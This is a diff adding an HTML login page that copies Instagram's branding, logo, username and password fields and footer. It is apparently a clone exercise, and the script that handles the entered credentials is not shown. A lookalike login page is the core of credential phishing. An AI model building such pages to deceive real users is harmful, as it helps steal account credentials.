@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login</title>
+  <link rel="icon" href="images/icon.png" />
+  <link rel="stylesheet" href="css/bootstrap.min.css">
+  <link rel="stylesheet" href="css/all.min.css">
+  <link rel="stylesheet" href="css/login.css">
+</head>
+
+<body class="bg-light">
+<div id="fb-root"></div>
+<script async defer crossorigin="anonymous" src="https://connect.facebook.net/ar_AR/sdk.js#xfbml=1&version=v17.0" nonce="CGVaQ9g5"></script>
+  <main class="d-flex flex-column align-items-center">
+    <div class="page">
+      <div class="header text-center">
+        <div class="logo"><img src="images/Instagram_logo.png"></div>
+      </div>
+      <div class="container">
+        <form>
+          <input type="text" class="form-control mb-2" id="emailInput" placeholder="Phone number, username, or email">
+          <div class="input-container">
+            
+            <input type="password" class="form-control mb-3" id="passwordInput" placeholder="Password">
+            <img class="show-password" src="images/icons8-eye-48.png" />
+          </div>
+          <button type="button" class="btn btn-primary btn-block" onclick="loginUser()">Log in</button>
+          <span id="validLogin" style="color: red;"></span>
+
+        </form>
+        <div class="header text-center">
+        <div class="d-flex align-items-center mt-3">
+          <hr class="flex-grow-1 m-0">
+          <p class="mx-3 mb-0">OR</p>
+          <hr class="flex-grow-1 m-0">
+          </div>
+        </div>
+        <div class="content__forgot-buttons">
+          <button class="btn">
+            <img src="images/face.png" alt="">
+            <span>Log in with Facebook</span>
+   <button class="btn btn-link">Forgot password?</button>
+        </div>
+      </div>
+    </div>
+    
+    <div class="option mt-4">
+      <p>Don't have an account? <a href="signup.html">Sign up</a></p>
+    </div>
+    
+    <div class="otherapps text-center mt-3">
+      <p>Get the app.</p>
+      <button class="btn btn-dark"><a href="https://play.google.com/store/apps/details?id=com.instagram.android"><img src="images/google-play.png" alt=""></a></button>
+      <button class="btn btn-dark"><a href="https://apps.microsoft.com/store/detail/instagram/9NBLGGH5L9XT"><img src="images/microsoft.png" alt=""></a></button>
+    </div>
+    <div class="footer mt-auto">
+      <ul class="list-inline text-center mb-1">
+        <li class="list-inline-item"><a href="">Meta</a></li>
+        <li class="list-inline-item"><a href="">About</a></li>
+        <li class="list-inline-item"><a href="">Blog</a></li>
+        <li class="list-inline-item"><a href="">Jobs</a></li>
+        <li class="list-inline-item"><a href="">Help</a></li>
+        <li class="list-inline-item"><a href="">API</a></li>
+        <li class="list-inline-item"><a href="">Privcy</a></li>
+        <li class="list-inline-item"><a href="">Terms</a></li>
+        <li class="list-inline-item"><a href="">Top Accounts</a></li>
+        <li class="list-inline-item"><a href="">Location</a></li>
+        <li class="list-inline-item"><a href="">Instagram Lite</a></li>
+        <li class="list-inline-item"><a href="">Theads</a></li>
+        <li class="list-inline-item"><a href="">Contact Uploading & Non-Users</a></li>
+        <li class="list-inline-item"><a href="">Meta Verified</a></li>
+      </ul>
+      <p class="mb-0 text-muted">© 2023 Instagram from Meta</p>
+    </div>
+  </main>
+
+  <script src="js/popper.min.js"></script>
+  <script src="js/all.min.js"></script>
+  <script src="js/bootstrap.min.js"></script>
+  <script src="js/login.js"></script>
+  
+</body>
+</html>
